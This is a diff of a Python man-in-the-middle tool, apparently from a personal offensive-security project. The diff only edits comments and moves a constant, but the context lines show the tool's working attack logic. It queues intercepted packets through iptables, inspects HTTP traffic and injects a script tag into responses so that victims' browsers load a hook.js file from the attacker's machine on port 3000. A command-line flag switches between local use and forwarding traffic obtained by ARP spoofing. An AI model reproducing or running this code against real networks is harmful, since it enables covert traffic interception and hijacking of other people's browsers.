@@ -8,21 +8,26 @@ import os
 from termcolor import cprint
 import re
 
-LINE = '____________________________________________________________'
 END_TAG = '</body>'
 IP_ADDRESS = get_if_addr(conf.iface) #IP of DEFAULT interface of MITM PC
 SCRIPT_TAG = '<script src="http://'+IP_ADDRESS+':3000/hook.js"></script>'
+LINE = '____________________________________________________________'
 
-#Process each packet
+
+'''
+Process each packet
+'''
 def process_packet(packet):
+    #Evaluate IP packet filtered
     IP_pkt = IP(packet.get_payload())
     
+    #If the IP packet has TCP layer and Raw layer (it can be HTTP packet)
     if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
-        #To manage fail of python convertion of some bytes
-        #(No HTML code, so I don't want to analyse this packet)
         try:
+            #Decode load of TCP packet
             load = IP_pkt[Raw].load.decode()
-        
+            
+            #HTTP requests from the victim to the client
             if IP_pkt[TCP].dport == 80:
                 cprint('Request', 'red', attrs=['bold',])
                 
@@ -39,6 +44,7 @@ def process_packet(packet):
 
                 packet.set_payload(bytes(IP_pkt))
 
+            #HTTP responses from the server to the victim
             elif IP_pkt[TCP].sport == 80:
                 cprint('Response', 'blue', attrs=['bold',])
                 load = injection_code(load)
@@ -53,11 +59,16 @@ def process_packet(packet):
                 packet.set_payload(bytes(IP_pkt))
         
         except UnicodeDecodeError:
+            #To manage fail of python convertion of some bytes
+            #(No HTML code, so I don't want to analyse this packet)
             pass
     
     packet.accept()
 
 
+'''
+Injection code
+'''
 def injection_code(load):
     global END_TAG, SCRIPT_TAG
 
@@ -76,11 +87,16 @@ def injection_code(load):
 
     return load
 
-#Parser of command line argument
+
+'''
+Parser of command line argument
+'''
 def args_parser():
     global SCRIPT_TAG
 
+    #Parser of command line arguments
     parser = argparse.ArgumentParser()
+    
     #Initialization of needed arguments
     parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
 
@@ -90,7 +106,11 @@ def args_parser():
     return args.local
 
 
+'''
+Main function
+'''
 def main():
+    #Parser of command line arguments
     local = args_parser()
 
     #Packets are blocked and not forwarded
@@ -116,6 +136,7 @@ def main():
         print('Flushing ip table.', end='\n')
         cprint(f'{LINE}','green', attrs=['bold',], end='\n\n')
         os.system('iptables -F')
+
 
 if __name__=='__main__':
 	main()
